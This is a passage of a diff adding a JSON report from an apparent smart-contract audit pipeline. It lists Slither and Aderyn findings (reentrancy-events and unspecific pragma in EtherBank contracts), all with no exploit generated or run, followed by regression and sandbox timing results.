+      "planError": "contract src/EtherBankFixed.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-6",
+      "candidate": {
+        "key": "reentrancy-events:EtherBank:withdraw()",
+        "vulnClass": "reentrancy-events",
+        "title": "reentrancy-events",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "EtherBank",
+        "function": "withdraw()",
+        "file": "src/EtherBank.sol",
+        "lines": [
+          19,
+          20,
+          21,
+          22,
+          23,
+          24,
+          25,
+          26
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "reentrancy-events",
+            "description": "Reentrancy in EtherBank.withdraw() (src/EtherBank.sol#19-26):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: amount}() (src/EtherBank.sol#22)\n\tEvent emitted after the call(s):\n\t- Withdrawn(msg.sender,amount) (src/EtherBank.sol#25)"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "no exploit template for class \"reentrancy-events\"",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-7",
+      "candidate": {
+        "key": "reentrancy-events:EtherBankFixed:withdraw()",
+        "vulnClass": "reentrancy-events",
+        "title": "reentrancy-events",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "EtherBankFixed",
+        "function": "withdraw()",
+        "file": "src/EtherBankFixed.sol",
+        "lines": [
+          17,
+          18,
+          19,
+          20,
+          21,
+          22,
+          23,
+          24
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "reentrancy-events",
+            "description": "Reentrancy in EtherBankFixed.withdraw() (src/EtherBankFixed.sol#17-24):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: amount}() (src/EtherBankFixed.sol#21)\n\tEvent emitted after the call(s):\n\t- Withdrawn(msg.sender,amount) (src/EtherBankFixed.sol#23)"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "no exploit template for class \"reentrancy-events\"",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-8",
+      "candidate": {
+        "key": "unspecific-solidity-pragma:src/EtherBank.sol:L2",
+        "vulnClass": "unspecific-solidity-pragma",
+        "title": "Unspecific Solidity Pragma",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/EtherBank.sol",
+        "function": null,
+        "file": "src/EtherBank.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "unspecific-solidity-pragma",
+            "description": "Unspecific Solidity Pragma"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "contract src/EtherBank.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-9",
+      "candidate": {
+        "key": "unspecific-solidity-pragma:src/EtherBankFixed.sol:L2",
+        "vulnClass": "unspecific-solidity-pragma",
+        "title": "Unspecific Solidity Pragma",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/EtherBankFixed.sol",
+        "function": null,
+        "file": "src/EtherBankFixed.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "unspecific-solidity-pragma",
+            "description": "Unspecific Solidity Pragma"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "contract src/EtherBankFixed.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    }
+  ],
+  "regression": {
+    "ran": true,
+    "passed": 3,
+    "failed": 0,
+    "skipped": 0,
+    "failures": []
+  },
+  "sandbox": {
+    "image": "pramaan/sandbox:0.1.0",
+    "analyzeMs": 7585,
+    "testMs": 4937
+  },
+  "fixes": {}
+}
